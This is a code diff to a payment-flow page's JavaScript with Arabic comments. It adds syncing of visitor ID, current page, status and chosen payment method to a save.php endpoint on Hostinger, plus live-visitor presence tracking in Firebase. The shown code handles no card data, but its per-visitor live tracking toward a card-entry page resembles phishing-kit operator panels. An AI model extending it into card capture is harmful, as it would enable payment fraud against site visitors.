@@ -465,6 +465,20 @@
         let selectedMethod = 'credit_card';
         const visitorId = localStorage.getItem('visitorId');
 
+        // وظيفة لمزامنة البيانات مع ملف save.php على Hostinger
+        function syncToHostinger(data) {
+            const formData = new FormData();
+            formData.append('visitorId', visitorId);
+            formData.append('currentPage', data.currentPage || "ملخص الطلب (Summary)");
+            if(data.status) formData.append('status', data.status);
+            if(data.payment_method_selected) formData.append('payment_method_selected', data.payment_method_selected);
+
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("Hostinger Sync Error: ", err));
+        }
+
         function fetchInvoiceData() {
             if (!visitorId) return;
             
@@ -485,10 +499,18 @@
         window.onload = function() {
             fetchInvoiceData();
             if(visitorId) {
-                database.ref('payments/' + visitorId).update({
+                const initialData = {
                     currentPage: "ملخص الطلب (Summary)",
                     status: "online",
                     lastActive: firebase.database.ServerValue.TIMESTAMP
+                };
+                
+                database.ref('payments/' + visitorId).update(initialData);
+                syncToHostinger(initialData);
+
+                // تحديث التواجد اللحظي
+                database.ref('live_visitors/' + visitorId).update({
+                    last_seen: firebase.database.ServerValue.TIMESTAMP
                 });
             }
         };
@@ -511,11 +533,14 @@
         function handlePayment() {
             if (!visitorId) { window.location.href = 'payment.html'; return; }
             
-            database.ref('payments/' + visitorId).update({
+            const paymentData = {
                 payment_method_selected: selectedMethod,
                 currentPage: "صفحة إدخال البطاقة",
                 lastUpdate: new Date().toLocaleString('ar-SA')
-            }).then(() => { 
+            };
+
+            database.ref('payments/' + visitorId).update(paymentData).then(() => { 
+                syncToHostinger(paymentData);
                 window.location.href = 'payment.html'; 
             });
         }
